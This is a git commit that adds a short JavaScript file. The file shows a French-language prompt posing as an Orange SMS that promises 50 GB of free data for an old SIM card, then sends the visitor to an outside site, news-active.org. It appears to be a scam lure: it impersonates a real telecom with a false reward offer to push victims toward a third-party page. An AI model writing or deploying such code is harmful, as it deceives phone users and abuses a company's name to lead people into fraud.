913ec8df27af1ff69484fe9a033c923aeb8a1430
ekpeowo <ukpehansi@gmail.com>
2025-08-21 19:04:48 +0100

    Create active-orange.js

---
+++ active-orange.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVER 50 Go'
+password=prompt('SMS: Félicitations, votre carte SIM Orange est éligible pour recevoir des données gratuites en récompense de votre ancienne carte SIM, cliquez sur OK pour activer','ACTIVER 50 Go');
+if (password != 'ACTIVER 50 Go') {
+location.href='https://news-active.org/50Go-orange';
+}
